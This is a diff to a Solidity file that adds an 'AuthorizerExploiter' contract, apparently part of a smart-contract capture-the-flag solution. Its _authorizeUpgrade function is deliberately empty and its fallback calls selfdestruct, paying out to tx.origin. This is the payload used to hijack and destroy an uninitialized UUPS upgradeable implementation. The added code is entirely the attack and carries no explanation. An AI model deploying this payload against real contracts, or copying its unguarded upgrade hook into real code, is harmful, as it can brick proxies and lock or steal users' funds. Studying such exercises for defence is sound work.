@@ -42,3 +42,18 @@ contract AuthorizerUpgradeable is Initializable, OwnableUpgradeable, UUPSUpgrade
 
     function _authorizeUpgrade(address imp) internal override onlyOwner {}
 }
+
+
+
+contract AuthorizerExploiter is UUPSUpgradeable {
+
+
+    function _authorizeUpgrade(
+        address newImplementation
+    ) internal virtual override {}
+
+    fallback() external {
+        selfdestruct(payable(tx.origin));
+    }
+}
+
